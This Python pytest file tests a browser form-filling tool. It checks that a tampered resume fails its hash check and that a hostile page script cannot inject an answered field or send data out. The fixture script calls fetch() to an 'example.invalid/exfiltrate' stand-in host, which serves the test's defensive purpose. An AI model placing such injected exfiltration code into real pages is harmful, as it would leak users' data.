import hashlib
import json
import threading
from http.server import ThreadingHTTPServer

import pytest
from patchright.sync_api import sync_playwright

from erga_autopilot import browser


def test_changed_provisioned_resume_fails_closed(tmp_path):
    pdf = tmp_path / "erga-synthetic-resume.pdf"
    pdf.write_bytes(b"synthetic PDF bytes")
    digest = hashlib.sha256(pdf.read_bytes()).hexdigest()
    (tmp_path / "resume-manifest.json").write_text(json.dumps({"sha256": digest}))
    assert browser.synthetic_resume(tmp_path) == (pdf, digest)
    pdf.write_bytes(b"tampered")
    with pytest.raises(PermissionError):
        browser.synthetic_resume(tmp_path)


@pytest.mark.parametrize("injected_answer", ["", "4.0"])
def test_dynamic_fields_and_external_requests_cannot_gain_authority(
    tmp_path, monkeypatch, injected_answer
):
    original = browser.fixture_html()
    script = """<script>
      document.querySelector('#f5').addEventListener('input', () => {
        if (document.querySelector('#late')) return;
        const label=document.createElement('label'); label.htmlFor='late'; label.textContent='GPA';
        const input=document.createElement('input'); input.id='late'; input.value=ANSWER;
        document.querySelector('form').append(label,input);
        fetch('https://example.invalid/exfiltrate?synthetic=true').catch(()=>{});
      });
    </script>""".replace("ANSWER", json.dumps(injected_answer))
    monkeypatch.setattr(
        browser, "fixture_html", lambda: original.replace(b"</body>", script.encode() + b"</body>")
    )
    server = ThreadingHTTPServer(("127.0.0.1", 0), browser.FixtureHandler)
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    resume = tmp_path / "resume.txt"
    resume.write_text("synthetic")
    digest = hashlib.sha256(resume.read_bytes()).hexdigest()
    try:
        with sync_playwright() as p:
            # Test the runtime route guard independently of the fixture's CSP.
            context = p.chromium.launch_persistent_context(
                str(tmp_path / "profile"), headless=True, bypass_csp=True
            )
            try:
                page = context.pages[0]
                failed = []
                page.on("requestfailed", lambda request: failed.append(request.url))
                args = (
                    page,
                    f"http://127.0.0.1:{server.server_port}/application",
                    browser.SYNTHETIC,
                    resume,
                    digest,
                )
                if injected_answer:
                    with pytest.raises(ValueError, match="Unexpected dynamic field"):
                        browser.prepare(*args)
                else:
                    result = browser.prepare(*args)
                    assert len(result["filled"]) == 10
                    assert any(
                        q["label"] == "GPA" and q["state"] == "needs_user"
                        for q in result["pending"]
                    )
                    assert page.get_by_label("GPA", exact=True).input_value() == ""
                    assert result["submissions"] == 0
                assert any(url.startswith("https://example.invalid/exfiltrate") for url in failed)
            finally:
                context.close()
    finally:
        server.shutdown()
        server.server_close()
